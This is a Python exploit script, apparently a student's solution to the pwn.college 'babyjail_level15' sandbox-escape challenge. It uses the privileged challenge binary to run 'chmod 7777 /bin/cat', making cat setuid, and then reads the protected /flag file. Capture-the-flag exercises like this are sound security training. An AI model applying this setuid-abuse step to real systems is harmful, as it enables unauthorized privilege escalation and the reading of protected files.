# Nagib Lakhdari 3si2
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# This exploit was generated via
# 1) pwntools
# 2) ctfmate

import pexpect
import pwn
import time

BINARY = "/challenge/babyjail_level15"
LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"
LD = "/lib64/ld-linux-x86-64.so.2"

exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8  = pwn.p8
u8  = pwn.u8

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)

def local(argv=[], *a, **kw):
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

def exploit():  # Similar to exercise 14, but this time we will use elevated permissions of cat to read the flag
    child = pexpect.spawn('vm connect')  # Launch the 'vm connect' command to connect to the VM
    
    child.expect(r'Last login:', timeout=60)  # Wait for the "Last login:" message indicating the connection is established
    
    child.sendline('/challenge/babyjail_level15')  # Execute the challenge binary
    child.expect(r'bash-5.0# ', timeout=60)  # Wait for the bash prompt in the jail environment
    child.sendline('chmod 7777 /bin/cat')  # Elevate the permissions of the 'cat' command using the program's privileges
    child.expect(r'bash-5.0# ', timeout=60)  # With elevated permissions, we will be able to read the flag outside the sandbox
    child.sendline('exit')  # Exit the program now that we can read the flag
    
    child.sendline('cd /usr/bin')  # Change directory to /usr/bin
    child.sendline('cat /flag')  # Use 'cat' with elevated permissions to read the flag
    child.expect(r'pwn\.college\{.*?\}', timeout=60)  # Wait for and extract the flag in the pwn.college{...} format
    flag = child.after.decode().strip()  # Decode and strip any extra whitespace from the flag
    print(f'Flag: {flag}')  # Print the flag

    child.sendline('exit')  # Exit the VM
    child.close()  # Close the connection

if __name__ == "__main__":
    exploit()  # Execute the exploit function
